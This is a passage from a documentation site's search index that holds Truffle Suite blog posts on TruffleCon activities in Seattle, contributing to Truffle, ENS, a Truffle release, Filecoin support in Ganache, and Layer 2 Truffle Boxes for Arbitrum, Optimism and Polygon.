accessible to everyone. Armed with an immaculate fleet of turbocharged, all-wheel-drive cars, right from the beginning DirtFish was equipped to share with anyone the excitement of what a real rally car can do on a loose surface. In the fall of 2014, DirtFish embellished their offerings with the launch of rear-wheel drive programs. Similar in nature to the all-wheel drive programs, the precise and very sideways action the classes offer provides an entirely different challenge for drivers of every background. Ever since, DirtFish has become the most prestigious rally school in North America, providing the highest level of instruction, top level cars and gorgeous facilities all year round.","title":"DirtFish Rally Driving School"},{"location":"blog/the-best-things-to-do-in-seattle-during-trufflecon/index.html#hiking","text":"Hiking in nature has a positive impact on people's hearts, minds and bodies. It is vital for everyone to have the opportunity to access the outdoors, and the WTA is committed to reducing barriers to hiking trails and lands. We strive to inspire people to go outside\u2014giving them the skills and knowledge they need to recreate safely and sustainably. People will protect the places they love to hike. WTA rallies hikers to raise our collective voice to protect the places we love. Our voice is amplified by the support of our members and sweat equity of every volunteer who helps to build and maintain trails.","title":"Hiking"},{"location":"blog/the-best-things-to-do-in-seattle-during-trufflecon/index.html#mountain-biking","text":"Your all-inclusive mountain biking tour in Seattle includes pickup from Downtown Seattle or Bellevue and shuttle transportation to our favorite trails for intermediate and experienced cyclists. At the trailhead, you get your high-quality mountain bike, a helmet, gloves, and any other safety gear needed for our ride. Don't worry, we have plenty of water and snacks for our mountain biking adventure!","title":"Mountain Biking"},{"location":"blog/the-best-ways-to-contribute-to-truffle/index.html","text":"Have you ever thought about contributing to Truffle? All of us at Truffle really enjoy producing free and open source software, and it is especially fun when many of you in the community contribute. User contributions make life easier for us, make our work more enjoyable by showing that you\u2019re engaged, and often give us a chance to learn from those that offer code to the project. We\u2019d absolutely love any and all developers to contribute to our project. The following are a few ways that you can get involved. Read the contributor guidelines. \u00b6 The first step anyone should take before contributing to Truffle is to hop on over to our Github page and read our contributing guidelines . Our contributing guidelines will give you a baseline understanding of how Truffle is built, which tools to use during development, and other useful information to get you started. Make sure to read those guidelines before continuing on in this post. Follow the command flow. \u00b6 You\u2019ll see that the contributing guidelines focus on the command flow. This is because at its core, Truffle is a command line tool that processes and runs specific commands on behalf of a user. If you can figure out where a command starts, you can follow its execution to get a better understanding of what Truffle is doing. We recommend choosing your favorite command and following its path through the code. We\u2019d also recommend performing your own local experiments by changing the behavior of a specific command and seeing how it behaves. Don\u2019t forget to read the contributing guidelines above, as it tells you where to get started for each command. Change callbacks to Promises. \u00b6 Given the lifetime of the project -- over four years! -- Truffle has its share of legacy code. Before Promises became widespread in the Node world, callbacks were used to control the flow of asynchronous code within Truffle. The code was written in a style where a callback function was passed from one method to the next, intended to be executed after everything else had finished running or when an error occurred. Nowadays, many people find this style of code to be abstruse, and hard to understand, and now favor Promises over callbacks. We do too. One of our major tasks over the coming year is to rework our code to favor a Promise-based coding style instead of a callback-based one. We are always interested in receiving PRs that clean up our callbacks and make the code easier to understand for everyone (we love you async/await). Start small, and chat with us for larger tasks. \u00b6 It can be very overwhelming to begin contributing to Truffle with a big feature. Instead, we recommend going after a smaller, more bite-sized change that will not only make you feel more successful, but can also help you get a better understanding of the underlying code. If you find something trivial, like a documentation error, go ahead and fork the repository, make your changes, and submit a pull request. For something bigger, we like to have a discussion first as our tools support many different use cases and platforms. If you have a great idea for a change that will require significant effort, we recommend filing a GitHub issue with a proposal or contacting us using the channels below. We can layout specs, bounce ideas around, and agree on what\u2019s needed before you dive in. Tackle an issue. \u00b6 Many of our users submit issues for things that need to be fixed. Sometimes these issues are small bugs that have been able to hide in the cracks. Other times they can be large changes or feature requests that require significant effort to fix. Regardless of your appetite, our issues list is often a great place to start for people to contribute. Due to the nature of software, you\u2019re bound to find an issue that\u2019s right for you. And even if you don\u2019t think you can fix an issue, confirming that issues exist and giving us extra information can be extremely helpful. Often the biggest factor keeping a sneaky bug alive is information, so validating an issue exists and providing more data can help us squash that bug even faster. Contact us. \u00b6 As always, we\u2019d love to hear your feedback and concerns, as well as answer any questions you have when contributing to Truffle. Feel free to reach out to us on our Spectrum page, or file an issue on Github . We'd love to hear from you. Happy Truffling!","title":"The Best Ways to Contribute to Truffle"},{"location":"blog/the-best-ways-to-contribute-to-truffle/index.html#read-the-contributor-guidelines","text":"The first step anyone should take before contributing to Truffle is to hop on over to our Github page and read our contributing guidelines . Our contributing guidelines will give you a baseline understanding of how Truffle is built, which tools to use during development, and other useful information to get you started. Make sure to read those guidelines before continuing on in this post.","title":"Read the contributor guidelines."},{"location":"blog/the-best-ways-to-contribute-to-truffle/index.html#follow-the-command-flow","text":"You\u2019ll see that the contributing guidelines focus on the command flow. This is because at its core, Truffle is a command line tool that processes and runs specific commands on behalf of a user. If you can figure out where a command starts, you can follow its execution to get a better understanding of what Truffle is doing. We recommend choosing your favorite command and following its path through the code. We\u2019d also recommend performing your own local experiments by changing the behavior of a specific command and seeing how it behaves. Don\u2019t forget to read the contributing guidelines above, as it tells you where to get started for each command.","title":"Follow the command flow."},{"location":"blog/the-best-ways-to-contribute-to-truffle/index.html#change-callbacks-to-promises","text":"Given the lifetime of the project -- over four years! -- Truffle has its share of legacy code. Before Promises became widespread in the Node world, callbacks were used to control the flow of asynchronous code within Truffle. The code was written in a style where a callback function was passed from one method to the next, intended to be executed after everything else had finished running or when an error occurred. Nowadays, many people find this style of code to be abstruse, and hard to understand, and now favor Promises over callbacks. We do too. One of our major tasks over the coming year is to rework our code to favor a Promise-based coding style instead of a callback-based one. We are always interested in receiving PRs that clean up our callbacks and make the code easier to understand for everyone (we love you async/await).","title":"Change callbacks to Promises."},{"location":"blog/the-best-ways-to-contribute-to-truffle/index.html#start-small-and-chat-with-us-for-larger-tasks","text":"It can be very overwhelming to begin contributing to Truffle with a big feature. Instead, we recommend going after a smaller, more bite-sized change that will not only make you feel more successful, but can also help you get a better understanding of the underlying code. If you find something trivial, like a documentation error, go ahead and fork the repository, make your changes, and submit a pull request. For something bigger, we like to have a discussion first as our tools support many different use cases and platforms. If you have a great idea for a change that will require significant effort, we recommend filing a GitHub issue with a proposal or contacting us using the channels below. We can layout specs, bounce ideas around, and agree on what\u2019s needed before you dive in.","title":"Start small, and chat with us for larger tasks."},{"location":"blog/the-best-ways-to-contribute-to-truffle/index.html#tackle-an-issue","text":"Many of our users submit issues for things that need to be fixed. Sometimes these issues are small bugs that have been able to hide in the cracks. Other times they can be large changes or feature requests that require significant effort to fix. Regardless of your appetite, our issues list is often a great place to start for people to contribute. Due to the nature of software, you\u2019re bound to find an issue that\u2019s right for you. And even if you don\u2019t think you can fix an issue, confirming that issues exist and giving us extra information can be extremely helpful. Often the biggest factor keeping a sneaky bug alive is information, so validating an issue exists and providing more data can help us squash that bug even faster.","title":"Tackle an issue."},{"location":"blog/the-best-ways-to-contribute-to-truffle/index.html#contact-us","text":"As always, we\u2019d love to hear your feedback and concerns, as well as answer any questions you have when contributing to Truffle. Feel free to reach out to us on our Spectrum page, or file an issue on Github . We'd love to hear from you. Happy Truffling!","title":"Contact us."},{"location":"blog/the-blockchain-problem-that-ens-solves/index.html","text":"The blockchain world has a UI problem. This is what an Ethereum receiving address looks like: 0xfB6916095ca1df60bB79Ce92cE3Ea74c37c5d359 Bitcoin and other cryptocurrencies have the same problem, as do related decentralized projects like IPFS. The computer-generated address system works great for computers but isn\u2019t user-friendly. This isn\u2019t a new problem. The nascent Internet had a similar issue with IP addresses. For the Internet to eventually be used by millions and now billions of regular users, it needed a way to mask the machine-readable identifiers. So, in 1985, the \u201cphone book of the Internet,\u201d the Domain Name System (DNS), was born. While the DNS is used by many protocols, the World Wide Web really took the DNS mainstream. Can you imagine the web if users had to type in \u201c72.125.224.72\u201d rather than \u201cgoogle.com\u201d? The blockchain world needs the same thing. We could use the existing DNS, but it\u2019s a relatively centralized server architecture which makes it unattractive for blockchain applications. That\u2019s where the Ethereum Name Service (ENS) comes in. ENS provides the same basic functionality of DNS (look up the records for \u201cexample.tld,\u201d retrieve information), but replaces the hierarchical DNS server system with a few smart contracts on Ethereum. ENS is the naming service of the new decentralized Internet - with less infrastructure, better security, and of course less centralized control. ENS launched in 2017 with the native TLD.ETH, but we\u2019ve been experimenting with allowing owners of DNS domains to use their domains on ENS and have successfully done this with .XYZ and .LUXE domains. We plan on rolling out this capability to most other TLDs later this year. We want to make it as easy as possible for dapp developers to take advantage of the big UI gains that ENS provides, which is why we\u2019re working with Truffle. We are excited to be announcing several useful ENS integrations built into TruffleSuite at TruffleCon, so stay tuned! Register your domain name using ENS today! Helpful Links: * Website: https://ens.domains/ * Manager: https://manager.ens.domains/ * Docs: https://docs.ens.domains/ * Gitter: https://gitter.im/ethereum/go-ethereum/name-registry * Forum: https://discuss.ens.domains/","title":"The Blockchain UI Problem that ENS Solves"},{"location":"blog/token-taxonomy-framework/index.html","text":"To some, the sudden rise of Tokens in the blockchain dialog comes as a surprise. However, tokens have always been the bedrock of the blockchain movement. The introduction of SmartContract by Ethereum quickly overshadowed them, particularly in enterprise contexts. The capabilities of Smart Contracts and the broad acceptance of them, thanks to companies like Truffle, blazed a trail forward and we all went along. It wasn\u2019t until we got halfway up the trail that someone turned around and asked, \u201cdid we pack any trail mix?\u201d Sure, we had Ether, but one cannot persist on Ether alone. Focus shifted back to our roots. Developers who had steeped in SmartContracts turned their attention to tokens. However, they also brought a bit of baggage. You can do a lot in a Token using SmartContract concepts. We started to see the blurring of lines between what a contract was and what was a token, leading to a good bit of confusion all around. Back in April, the Token Taxonomy Initiative (TTI) was launched with very strong backing and a cross blockchain and platform set of founders including the EEA, ConsenSys, IBM, R3 and Digital Asset in an effort to provide clarity and purpose for tokens moving forward as the way we define value and how it can be used between parties across networks and platforms. The major deliverable from the TTI is the Token Taxonomy Framework (TTF), which is a platform neutral framework for defining and token that can eventually be certified and start to address critical issues like interoperability. I\u2019ll be presenting an Introduction to the TTF at TruffleCon on August 4th here in Redmond, WA. Swing by to hear how you can use the TTF to communicate with customers and partners, use the same terms and get solid requirements from the business, legal and regulatory communities.","title":"Token Taxonomy Framework"},{"location":"blog/truffle-320-released/index.html","text":"UPDATE : We made another minor release after this blog post was written upgrading web3 to 0.18.2 due to request of our users. Truffle v3.2.1 is now the latest release, but it still includes all the awesome stuff below. Hi all. Great news today. Following your feedback from the Truffle 3.0 release, we've just released Truffle 3.2.0! This release includes a number of great new features and bug fixes , but we're most excited about the following. I've bolded the good stuff for ya. We've built infrastructure for providing you boilerplates on demand! Now with truffle init comes truffle init webpack , which gives you a boilerplate web application combining the web development capabilities of Webpack with the power of Truffle. More boilerplates to come to make your life easier, so stay tuned! We've added huge speed improvements to the Truffle command line tool. Now your commands trigger in milliseconds! Go ahead, try it out. truffle version Solidity tests can now be given default balances so you can use those tests to exercise sending Ether to your contracts. Big win for Solidity tests, and your sanity in general. Documentation Similarly, Javascript abstractions got an upgrade making it easier to send Ether directly to your contracts as well as trigger your contracts' fallback functions. You can use this feature within your tests as well as within your application. More on that here . Also, they now use web3 0.18.2. Migrations got an extra scout badge (function parameter) , allowing you to view available accounts directly within your migration Oh, and there's no more naming restriction on contract names! \ud83c\udf89\ud83c\udf89\ud83c\udf89 You can now have a file called ImABigDeal.sol and have it define contracts under a completely different name. Woot! Along with the above, there's a new way of requiring contract artifacts within your migrations and tests . The old way still works if your contract names match your Solidity file names, but even if they don't you can simply require the contract by name: // Assume `ImABigDeal.sol` defines `contract MyContract { ... }` var MyContract = artifacts . require ( \"MyContract\" ); There's been a lot of bug fixes too. Check out the release notes on Github for a full list of changes, upgrades and fixes. Big thanks! \u00b6 As always, we have to give you all a big thanks for being a part of the community and making Truffle better. This release would not be possible without your continued feedback, bug fixes and pull requests. If you run into trouble with any of the above, reach out on our community Gitter channel where hundreds of your fellow Trufflers congregate to answer your questions. As well, check us out on Twitter and send us a tweet. Cheers, and happy coding! -- Tim","title":"Truffle 3.2.0 released"},{"location":"blog/truffle-320-released/index.html#big-thanks","text":"As always, we have to give you all a big thanks for being a part of the community and making Truffle better. This release would not be possible without your continued feedback, bug fixes and pull requests. If you run into trouble with any of the above, reach out on our community Gitter channel where hundreds of your fellow Trufflers congregate to answer your questions. As well, check us out on Twitter and send us a tweet. Cheers, and happy coding! -- Tim","title":"Big thanks!"},{"location":"blog/truffle-and-ganache-now-come-in-filecoin-flavor/index.html","text":"Filecoin was created by Protocol Labs , the same organization who created and maintains IPFS . Filecoin extends the IPFS vision by creating an open-source decentralized storage network that provides incentives to keep data stored and pinned on IPFS. Filecoin is powerful because it provides a decentralized storage solution without having to rely on larger centralized solutions. Additionally when it comes to building dapps on other decentralized networks, like Ethereum, it provides the groundwork for a much needed storage and authenticity solution to full decentralization. Truffle Preserve to Buckets \u00b6 Back in July , we announced a first look at using the truffle preserve command in an experimental release. Today, we are releasing truffle preserve as part of the main, stable version of Truffle! To use truffle preserve , simply specify the files you want to preserve on the command line, and choose between the --filecoin , --ipfs , or --buckets recipes. The filecoin recipe uses the ipfs recipe under the hood, but if you need to, you can choose to use the ipfs recipe without filecoin . You can learn more about truffle preserve in this blog post . In addition, we\u2019re also introducing a new recipe for truffle preserve which allows developers to save data to Textile Buckets : truffle preserve --buckets . Try out any of these three recipes today by downloading the latest version of Truffle ! Filecoin-flavored Ganache \u00b6 Ganache has helped many developers create Ethereum dapps by providing a \"one-click\" experience; Ganache automates the difficult parts of running a decentralized network to give the developer a personal environment to tinker with and develop applications. It speeds up development by not having to wait for decentralized test networks to confirm transactions, and it provides a controlled, configurable environment to reproduce different test scenarios. Prior to Ganache, if you wanted to run a development network for Filecoin you would need to run the lotus-devnet , which requires compiling native resources or running a public Docker image. This is still a great resource to emulate the Filecoin network as close as possible as it includes a real Lotus node, but Ganache now provides a lightweight alternative for getting started with Filecoin app development. With the Filecoin flavor, Ganache now provides you both an IPFS server (used to store files) as well as a Lotus simulator (used to maintain file storage, simulate a storage provider, and availability) to add the necessary Filecoin methods to get started with Filecoin development. Like the Ethereum flavor of Ganache, we've made the process as simple as possible for you to get started with Filecoin quickly. What can I do with Filecoin-flavored Ganache? \u00b6 With Filecoin-flavored Ganache, you can do most of the development tasks for building a Filecoin application: - Store and retrieve files from a personal IPFS node that Ganache starts for you - Create a storage deal and see it progress through different states - Test how your application handles storage deal expiration - Transfer Filecoin's token FIL between accounts - Interact with the various Filecoin wallet methods You can find a full list of supported RPC methods on GitHub . How do I get started? \u00b6 If you\u2019re looking to get started with Ganache, head over to the documentation to see Get Started guides whether you're using the NodeJS library, CLI, or graphical UI version. Need an example on how to build a Filecoin application? Check out the Filecoin Truffle Box to see an example to mint NFTs and provide a decentralized art gallery application. We\u2019re finalizing the Truffle documentation in the coming days, so stay tuned for those! When they\u2019re live, you\u2019ll be able to find them at our main documentation page and click on the Filecoin link. Where can I get help? \u00b6 We're extremely excited to be working with the Filecoin community to add support for Filecoin into Truffle Suite's tooling. If you have questions about our Filecoin integration or our plan for the future, join Truffle\u2019s Discord community & the Filecoin community Slack to get your questions answered. We're happy to help!","title":"Truffle and Ganache now come in Filecoin Flavor"},{"location":"blog/truffle-and-ganache-now-come-in-filecoin-flavor/index.html#truffle-preserve-to-buckets","text":"Back in July , we announced a first look at using the truffle preserve command in an experimental release. Today, we are releasing truffle preserve as part of the main, stable version of Truffle! To use truffle preserve , simply specify the files you want to preserve on the command line, and choose between the --filecoin , --ipfs , or --buckets recipes. The filecoin recipe uses the ipfs recipe under the hood, but if you need to, you can choose to use the ipfs recipe without filecoin . You can learn more about truffle preserve in this blog post . In addition, we\u2019re also introducing a new recipe for truffle preserve which allows developers to save data to Textile Buckets : truffle preserve --buckets . Try out any of these three recipes today by downloading the latest version of Truffle !","title":"Truffle Preserve to Buckets"},{"location":"blog/truffle-and-ganache-now-come-in-filecoin-flavor/index.html#filecoin-flavored-ganache","text":"Ganache has helped many developers create Ethereum dapps by providing a \"one-click\" experience; Ganache automates the difficult parts of running a decentralized network to give the developer a personal environment to tinker with and develop applications. It speeds up development by not having to wait for decentralized test networks to confirm transactions, and it provides a controlled, configurable environment to reproduce different test scenarios. Prior to Ganache, if you wanted to run a development network for Filecoin you would need to run the lotus-devnet , which requires compiling native resources or running a public Docker image. This is still a great resource to emulate the Filecoin network as close as possible as it includes a real Lotus node, but Ganache now provides a lightweight alternative for getting started with Filecoin app development. With the Filecoin flavor, Ganache now provides you both an IPFS server (used to store files) as well as a Lotus simulator (used to maintain file storage, simulate a storage provider, and availability) to add the necessary Filecoin methods to get started with Filecoin development. Like the Ethereum flavor of Ganache, we've made the process as simple as possible for you to get started with Filecoin quickly.","title":"Filecoin-flavored Ganache"},{"location":"blog/truffle-and-ganache-now-come-in-filecoin-flavor/index.html#what-can-i-do-with-filecoin-flavored-ganache","text":"With Filecoin-flavored Ganache, you can do most of the development tasks for building a Filecoin application: - Store and retrieve files from a personal IPFS node that Ganache starts for you - Create a storage deal and see it progress through different states - Test how your application handles storage deal expiration - Transfer Filecoin's token FIL between accounts - Interact with the various Filecoin wallet methods You can find a full list of supported RPC methods on GitHub .","title":"What can I do with Filecoin-flavored Ganache?"},{"location":"blog/truffle-and-ganache-now-come-in-filecoin-flavor/index.html#how-do-i-get-started","text":"If you\u2019re looking to get started with Ganache, head over to the documentation to see Get Started guides whether you're using the NodeJS library, CLI, or graphical UI version. Need an example on how to build a Filecoin application? Check out the Filecoin Truffle Box to see an example to mint NFTs and provide a decentralized art gallery application. We\u2019re finalizing the Truffle documentation in the coming days, so stay tuned for those! When they\u2019re live, you\u2019ll be able to find them at our main documentation page and click on the Filecoin link.","title":"How do I get started?"},{"location":"blog/truffle-and-ganache-now-come-in-filecoin-flavor/index.html#where-can-i-get-help","text":"We're extremely excited to be working with the Filecoin community to add support for Filecoin into Truffle Suite's tooling. If you have questions about our Filecoin integration or our plan for the future, join Truffle\u2019s Discord community & the Filecoin community Slack to get your questions answered. We're happy to help!","title":"Where can I get help?"},{"location":"blog/truffle-and-infura-support-arbitrum/index.html","text":"In our continuing efforts to help build the emerging multi-network Ethereum ecosystem, the Truffle team is thrilled to announce the launch of the Arbitrum Truffle Box. The usability and efficiency of Ethereum depends on scalability, and Arbitrum\u2019s Layer 2 solution blends security and higher throughput to help make scalable Ethereum a reality. Arbitrum \u00b6 Arbitrum is a Layer 2 scaling solution for Ethereum that uses optimistic rollups with interactive proving to make smart contracts scalable, fast, and private. It tracks closely to Ethereum, so that Ethereum developers can easily cross-compile their contracts to deploy on Arbitrum. Arbitrum offers its developers a variety of benefits: trustless security, compatibility with Ethereum, scalability, and cost efficiency. The Arbitrum rollup chain is built on top of and secured by Ethereum. From the developer perspective, interacting with Arbitrum is nearly identical to interacting with Ethereum. Arbitrum supports the same RPC interface as Ethereum, supports all EVM languages, and natively supports all Ethereum tooling without any special adapters. The main difference users and developers will notice is that transactions on Arbitrum cost a fraction of what they would if run natively on Ethereum. It is important to understand the mechanics of withdrawing funds from the Arbitrum chain. When withdrawing to Ethereum through an Arbitrum bridge, there is a delay to ensure that the transactions being rolled up are confirmed. Information about this finality delay and potential methods to avoid it can be found in Arbitrum's documentation here . For more details on Arbitrum\u2019s protocol, see their complete documentation . Introducing The Arbitrum Truffle Box \u00b6 The Truffle Arbitrum Box provides developers with the boilerplate structure necessary to start coding for Arbitrum\u2019s Ethereum Layer 2 solution. We provide the initial building blocks to get started working on Arbitrum without pushing developers to write any particular sort of application. With this box, you will be able to compile, migrate, and test Solidity code against several instances of Arbitrum Networks. Arbitrum\u2019s Layer 2 solution is almost fully compatible with the EVM. The main difference between the EVM and the Arbitrum chain that developers will notice is that some opcodes are different and concepts such as time and gas are handled a little differently. Developers can use their regular Solidity compiler to compile contracts for Arbitrum. You can see the complete list of differences between the Arbitrum L2 chain and Ethereum here . Integration With Infura \u00b6 Our colleagues at Infura are also adding full API support for the Arbitrum network. Infura users can now add the free Arbitrum add-on directly in their Infura dashboard. The Arbitrum network API largely uses the same JSON RPC specification as Ethereum and Infura will support all the necessary API methods for building a fully functional application on the Arbitrum network. For more information on the full support check out the complete documentation . Infura endpoints for the Arbitrum chain are included in the configuration of the Arbitrum Truffle Box, to aid developers in getting fully acquainted with their options when developing for Arbitrum. Where To Get Help \u00b6 You can find all of the documentation for the Truffle Arbitrum Box here . If you have any questions, feedback, or just want to chat, reach out to us through the resources on our community page . We are thrilled to add Arbitrum to the Truffle development suite and can\u2019t wait to see the universe of applications built on Layer 2. Stay tuned as we continue to add more networks, features, and tools that accelerate and simplify development on a secure and scalable Ethereum.","title":"Truffle and Infura Now Support Arbitrum"},{"location":"blog/truffle-and-infura-support-arbitrum/index.html#arbitrum","text":"Arbitrum is a Layer 2 scaling solution for Ethereum that uses optimistic rollups with interactive proving to make smart contracts scalable, fast, and private. It tracks closely to Ethereum, so that Ethereum developers can easily cross-compile their contracts to deploy on Arbitrum. Arbitrum offers its developers a variety of benefits: trustless security, compatibility with Ethereum, scalability, and cost efficiency. The Arbitrum rollup chain is built on top of and secured by Ethereum. From the developer perspective, interacting with Arbitrum is nearly identical to interacting with Ethereum. Arbitrum supports the same RPC interface as Ethereum, supports all EVM languages, and natively supports all Ethereum tooling without any special adapters. The main difference users and developers will notice is that transactions on Arbitrum cost a fraction of what they would if run natively on Ethereum. It is important to understand the mechanics of withdrawing funds from the Arbitrum chain. When withdrawing to Ethereum through an Arbitrum bridge, there is a delay to ensure that the transactions being rolled up are confirmed. Information about this finality delay and potential methods to avoid it can be found in Arbitrum's documentation here . For more details on Arbitrum\u2019s protocol, see their complete documentation .","title":"Arbitrum"},{"location":"blog/truffle-and-infura-support-arbitrum/index.html#introducing-the-arbitrum-truffle-box","text":"The Truffle Arbitrum Box provides developers with the boilerplate structure necessary to start coding for Arbitrum\u2019s Ethereum Layer 2 solution. We provide the initial building blocks to get started working on Arbitrum without pushing developers to write any particular sort of application. With this box, you will be able to compile, migrate, and test Solidity code against several instances of Arbitrum Networks. Arbitrum\u2019s Layer 2 solution is almost fully compatible with the EVM. The main difference between the EVM and the Arbitrum chain that developers will notice is that some opcodes are different and concepts such as time and gas are handled a little differently. Developers can use their regular Solidity compiler to compile contracts for Arbitrum. You can see the complete list of differences between the Arbitrum L2 chain and Ethereum here .","title":"Introducing The Arbitrum Truffle Box"},{"location":"blog/truffle-and-infura-support-arbitrum/index.html#integration-with-infura","text":"Our colleagues at Infura are also adding full API support for the Arbitrum network. Infura users can now add the free Arbitrum add-on directly in their Infura dashboard. The Arbitrum network API largely uses the same JSON RPC specification as Ethereum and Infura will support all the necessary API methods for building a fully functional application on the Arbitrum network. For more information on the full support check out the complete documentation . Infura endpoints for the Arbitrum chain are included in the configuration of the Arbitrum Truffle Box, to aid developers in getting fully acquainted with their options when developing for Arbitrum.","title":"Integration With Infura"},{"location":"blog/truffle-and-infura-support-arbitrum/index.html#where-to-get-help","text":"You can find all of the documentation for the Truffle Arbitrum Box here . If you have any questions, feedback, or just want to chat, reach out to us through the resources on our community page . We are thrilled to add Arbitrum to the Truffle development suite and can\u2019t wait to see the universe of applications built on Layer 2. Stay tuned as we continue to add more networks, features, and tools that accelerate and simplify development on a secure and scalable Ethereum.","title":"Where To Get Help"},{"location":"blog/truffle-and-infura-support-optimism/index.html","text":"Developer demand for scalable Ethereum application development tooling continues to grow. The multi-network Ethereum ecosystem is here, and Layer 2 solutions such as Optimistic Ethereum are leading the way. The Truffle team is delighted to support Optimistic Ethereum in helping developers build for this ecosystem. Today we are announcing the launch of the new Truffle Optimism Box. Optimistic Ethereum \u00b6 Optimistic Ethereum is a Layer 2 scaling protocol for Ethereum applications. It is an application inside of Ethereum that executes transactions more efficiently than Ethereum itself, based on the concept of an Optimistic Rollup . The Optimistic Ethereum security model is backed by a system of \u201cfraud proofs\u201d that allow users to identify bad transaction results to support the accuracy of the data that is eventually rolled up and published to the main Ethereum chain. Transactions on Optimistic Ethereum are handled similarly to those on the Ethereum mainnet, and bridging between Optimistic Ethereum and mainnet Ethereum allows users to conduct gas-intensive operations on Optimistic Ethereum for a fraction of the cost. Optimistic Ethereum tracks closely to the structure and operation of the Ethereum mainnet, preserving security guarantees while increasing throughput and decreasing transaction costs. Important to note, this protocol requires a delay for bridging funds from Optimism back to Ethereum, and you can find more information about that here . Existing Solidity smart contracts can run on Optimistic Ethereum with minimal differences. Off-chain code such as user interfaces and wallets will need to update their RPC endpoints to interact with Optimistic Ethereum, and will largely just work once the update is made. For detailed documentation on the Optimistic Ethereum protocol, see here and here . Introducing the Truffle Optimism Box \u00b6 The Truffle Optimism Box provides developers with the boilerplate structure necessary to start coding for Optimism\u2019s Ethereum Layer 2 solution. We provide the initial building blocks to get to work on Optimistic Ethereum without pushing developers to write any particular sort of application. With this box, you will be able to compile, migrate, and test Solidity code against several instances of Optimistic Ethereum networks. Optimism\u2019s Layer 2 solution is almost fully compatible with the EVM, though it uses an \u201coptimistic\u201d EVM called the OVM. The main difference between the EVM and the OVM that developers will notice is that some opcodes are not available for contracts that are deployed to the OVM. The Truffle Optimism Box is complete with the Optimistic solc compiler already referenced in the truffle-config.ovm.js file. You can see a complete list of differences between Optimism\u2019s fork of the solc compiler and the original here . Integration With Infura \u00b6 Our colleagues at Infura are also adding full API support for the Optimistic Ethereum network. Infura users can now add the free Optimism add-on directly in their Infura dashboard. The Optimism network API largely uses the same JSON RPC specification as Ethereum and Infura will support all the necessary API methods for building a fully functional application on the Optimistic Ethereum network. For more information on the full support check out the complete documentation . Infura endpoints for the Optimistic Ethereum chain are included in the configuration of the Optimism Truffle Box, to aid developers in getting fully acquainted with their options when developing for the Optimistic Ethereum chain. Where to Get Help \u00b6 You can find all of the documentation for the Truffle Optimism Box here . If you have any questions, feedback, or just want to chat, reach out to us through the resources on our community page . We are thrilled to add Optimistic Ethereum to the Truffle development suite and can\u2019t wait to see the universe of applications built on Layer 2. Stay tuned as we continue to add more networks, features, and tools that accelerate and simplify development on a secure and scalable Ethereum.","title":"Truffle and Infura Now Support Optimism"},{"location":"blog/truffle-and-infura-support-optimism/index.html#optimistic-ethereum","text":"Optimistic Ethereum is a Layer 2 scaling protocol for Ethereum applications. It is an application inside of Ethereum that executes transactions more efficiently than Ethereum itself, based on the concept of an Optimistic Rollup . The Optimistic Ethereum security model is backed by a system of \u201cfraud proofs\u201d that allow users to identify bad transaction results to support the accuracy of the data that is eventually rolled up and published to the main Ethereum chain. Transactions on Optimistic Ethereum are handled similarly to those on the Ethereum mainnet, and bridging between Optimistic Ethereum and mainnet Ethereum allows users to conduct gas-intensive operations on Optimistic Ethereum for a fraction of the cost. Optimistic Ethereum tracks closely to the structure and operation of the Ethereum mainnet, preserving security guarantees while increasing throughput and decreasing transaction costs. Important to note, this protocol requires a delay for bridging funds from Optimism back to Ethereum, and you can find more information about that here . Existing Solidity smart contracts can run on Optimistic Ethereum with minimal differences. Off-chain code such as user interfaces and wallets will need to update their RPC endpoints to interact with Optimistic Ethereum, and will largely just work once the update is made. For detailed documentation on the Optimistic Ethereum protocol, see here and here .","title":"Optimistic Ethereum"},{"location":"blog/truffle-and-infura-support-optimism/index.html#introducing-the-truffle-optimism-box","text":"The Truffle Optimism Box provides developers with the boilerplate structure necessary to start coding for Optimism\u2019s Ethereum Layer 2 solution. We provide the initial building blocks to get to work on Optimistic Ethereum without pushing developers to write any particular sort of application. With this box, you will be able to compile, migrate, and test Solidity code against several instances of Optimistic Ethereum networks. Optimism\u2019s Layer 2 solution is almost fully compatible with the EVM, though it uses an \u201coptimistic\u201d EVM called the OVM. The main difference between the EVM and the OVM that developers will notice is that some opcodes are not available for contracts that are deployed to the OVM. The Truffle Optimism Box is complete with the Optimistic solc compiler already referenced in the truffle-config.ovm.js file. You can see a complete list of differences between Optimism\u2019s fork of the solc compiler and the original here .","title":"Introducing the Truffle Optimism Box"},{"location":"blog/truffle-and-infura-support-optimism/index.html#integration-with-infura","text":"Our colleagues at Infura are also adding full API support for the Optimistic Ethereum network. Infura users can now add the free Optimism add-on directly in their Infura dashboard. The Optimism network API largely uses the same JSON RPC specification as Ethereum and Infura will support all the necessary API methods for building a fully functional application on the Optimistic Ethereum network. For more information on the full support check out the complete documentation . Infura endpoints for the Optimistic Ethereum chain are included in the configuration of the Optimism Truffle Box, to aid developers in getting fully acquainted with their options when developing for the Optimistic Ethereum chain.","title":"Integration With Infura"},{"location":"blog/truffle-and-infura-support-optimism/index.html#where-to-get-help","text":"You can find all of the documentation for the Truffle Optimism Box here . If you have any questions, feedback, or just want to chat, reach out to us through the resources on our community page . We are thrilled to add Optimistic Ethereum to the Truffle development suite and can\u2019t wait to see the universe of applications built on Layer 2. Stay tuned as we continue to add more networks, features, and tools that accelerate and simplify development on a secure and scalable Ethereum.","title":"Where to Get Help"},{"location":"blog/truffle-and-infura-support-polygon/index.html","text":"The developer demand for scaling solutions that work directly with Ethereum is here and growing, so today we are very excited to launch the new Polygon Truffle Box. Ethereum-based dapp development is rapidly entering a new phase wherein a multi-network future is certain and Layer 2 solutions like Polygon's are leading the charge into this uncharted territory. Layer 2 scaling is essential to the health of the Ethereum ecosystem, and the Truffle team is delighted to support the Polygon PoS chain in helping developers build toward this future. Polygon PoS Chain \u00b6 Polygon PoS is a hybrid Plasma Proof-of-Stake sidechain to the Ethereum mainnet which consists of a Tendermint consensus validator layer and a Plasma sidechain for block production. This configuration allows for higher transaction throughput, lower gas fees, and through Polygon's established bridges, easy connection back to the Ethereum mainnet. Introducing the Polygon Truffle Box \u00b6 The core component of this new tooling is the Truffle Polygon Box . This new Truffle box provides you with the boilerplate structure necessary to start coding for Polygon's Ethereum L2 solution, the Polygon PoS chain (previously the Matic PoS chain). For detailed information on how the Polygon PoS chain works, please see their documentation here . We provide the initial building blocks needed to get to work on Polygon PoS without pushing developers to write any particular sort of application. With this box, you will be able to compile, migrate, and test Solidity code against several instances of Polygon PoS networks. Polygon's L2 solution is fully compatible with the EVM. This means you will not need a new compiler to deploy Solidity contracts, and should be able to add your own Solidity contracts to this project. The main difference 